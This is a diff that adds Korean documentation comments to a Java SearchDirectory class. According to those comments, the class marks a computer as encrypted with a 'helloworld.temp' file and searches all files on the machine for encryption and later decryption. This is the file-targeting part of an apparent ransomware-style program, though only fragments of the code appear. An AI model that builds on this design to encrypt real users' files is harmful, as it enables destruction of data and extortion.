@@ -39,6 +39,10 @@ public class SearchDirectory {
         initContainFilter();
     }
 
+    /**
+     * 현재 이 컴퓨터가 암호화 되어있는 상태인지 helloworld.temp의 파일 여부로 결정하는 함수
+     * @return
+     */
     public boolean isEncrypted()
     {
         File file = new File(defaultDirectory);
@@ -51,6 +55,9 @@ public class SearchDirectory {
        return false;
     }
 
+    /**
+     * helloworld.temp파일을 생성함으로서 이 컴퓨터가 암호화 되었다는 지표를 남기는 함수
+     */
     public void setEncrypted()
     {
         try {
@@ -80,6 +87,9 @@ public class SearchDirectory {
 
     }
 
+    /**
+     * helloworld.temp파일을 제거하는 함수
+     */
     public void setDecrypted()
     {
         if(defaultDirectory.endsWith("/") || defaultDirectory.endsWith("\\"))
@@ -102,6 +112,10 @@ public class SearchDirectory {
         }
     }
 
+    /**
+     * 암호화할 컴퓨터 내의 모든 파일 검색후 반환
+     * @return 찾아낸 모든 파일의 list 넘김
+     */
     public ArrayList<File> allFileSearch()
     {
 
@@ -115,6 +129,10 @@ public class SearchDirectory {
         return allFiles;
     }
 
+    /**
+     * 복호화할 파일을 검색후 반환
+     * @return 복호화 할 파일
+     */
     public ArrayList<File> decryptSearch()
     {
 
@@ -259,6 +277,10 @@ public class SearchDirectory {
         }
     }
 
+    /**
+     * 복호화할 파일 검색 알고리즘
+     * @param source
+     */
     private void getEncryptedList(String source){
         File dir = new File(source);
         File[] fileList = dir.listFiles();
@@ -298,6 +320,9 @@ public class SearchDirectory {
             return this.containsFilters.contains(FilenameUtils.getExtension(file.getName()));
     }
 
+    /**
+     * 검색한 파일 인덱스 제거
+     */
     public void clearFiles()
     {
         this.encryptedFiles.clear();
